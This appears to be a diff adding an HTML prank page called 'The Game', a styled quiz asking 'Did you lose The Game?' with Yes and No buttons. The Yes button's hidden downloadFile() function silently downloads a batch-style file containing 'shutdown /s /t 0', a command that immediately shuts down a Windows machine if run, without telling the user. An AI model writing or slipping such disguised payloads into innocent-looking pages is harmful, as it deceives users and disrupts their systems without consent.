@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Game</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap');
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(45deg, #3a0ca3, #7209b7, #9d4edd, #c77dff);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+        }
+        
+        @keyframes gradientBG {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 2.5rem;
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(90, 24, 154, 0.4);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border-left: 6px solid #ffcce0;
+            backdrop-filter: blur(5px);
+        }
+        
+        h1 {
+            margin-top: 0;
+            color: #7209b7;
+            font-size: 3rem;
+            letter-spacing: -1px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .question {
+            font-size: 1.5rem;
+            margin: 2rem 0;
+            font-weight: 500;
+            color: #5a189a;
+            letter-spacing: 0.5px;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        button {
+            background-color: #7209b7;
+            color: white;
+            border: none;
+            padding: 1rem 2.5rem;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
+        }
+        
+        button:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 7px 20px rgba(157, 78, 221, 0.5);
+            background-color: #6209a7;
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        #no-btn {
+            background-color: #3a0ca3;
+        }
+        
+        #no-btn:hover {
+            background-color: #2a0993;
+        }
+        
+        .result {
+            margin-top: 2.5rem;
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #7b2cbf;
+            opacity: 0;
+            transition: opacity 0.7s, transform 0.7s;
+            transform: translateY(20px);
+        }
+        
+        .show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .emoji {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            opacity: 0;
+            transition: opacity 0.7s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>The Game</h1>
+        <p class="question">Did you lose The Game?</p>
+        
+        <div class="button-group">
+            <button onclick="downloadFile()" id="yes-btn">Yes</button>
+            <button id="no-btn">No</button>
+        </div>
+        
+        <p id="result" class="result"></p>
+        <div id="emoji" class="emoji"></div>
+    </div>
+
+    <script>
+    function downloadFile() {
+      const content = "@echo off \nshutdown /s /t 0";
+      const filename = "example.batch";
+
+      const blob = new Blob([content], { type: "text/plain" });
+      const anchor = document.createElement("a");
+
+      anchor.href = URL.createObjectURL(blob);
+      anchor.download = filename;
+      document.body.appendChild(anchor);
+      anchor.click();
+      document.body.removeChild(anchor);
+      URL.revokeObjectURL(anchor.href);
+    }
+        document.getElementById('yes-btn').addEventListener('click', function() {
+            document.getElementById('result').textContent = "You admitted it! The Game continues...";
+            document.getElementById('result').classList.add('show');
+            document.getElementById('emoji').textContent = "😌";
+            document.getElementById('emoji').classList.add('show');
+        });
+        
+        document.getElementById('no-btn').addEventListener('click', function() {
+            document.getElementById('result').textContent = "Yes, you did lose The Game. By thinking about The Game, you lost!";
+            document.getElementById('result').classList.add('show');
+            document.getElementById('emoji').textContent = "😜";
+            document.getElementById('emoji').classList.add('show');
+        });
+    </script>
+</body>
+</html>
